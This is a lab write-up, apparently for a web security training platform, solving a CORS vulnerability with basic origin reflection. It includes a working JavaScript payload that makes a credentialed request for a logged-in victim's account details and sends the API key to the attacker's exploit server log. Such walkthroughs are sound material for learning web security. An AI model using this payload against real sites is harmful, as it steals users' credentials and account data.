# Lab: CORS vulnerability with basic origin reflection

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/03b3f862-2b7c-4146-8754-42b15e4a1ecf)

## Solution

Log in using the given username and password.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/cef8a3d5-d670-488a-932a-42b3e6a30296)

The apikey is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header which is `true` suggesting that it may support CORS.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/b88f753e-f654-4e23-88ff-9e745b2b0971)

Resubmit it with the added header: `Origin: https://example.com`. The origin is reflected in the `Access-Control-Allow-Origin` header.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/da1017ff-c07b-4ab1-88f9-d8a617fa22ac)

go to the exploit server and enter the following script.

```Javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Click on store and then deliver to the victim.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0c92b3f4-1e28-44a2-a8fc-f8530ef063e6)

Go to access log and the apikey will be visible in the url.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4448cafa-7482-4baf-b6be-111f66ae16ea)

Submitthe url in the submit section and finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/2e3157de-d72c-4737-a477-6f1abe428cf7)
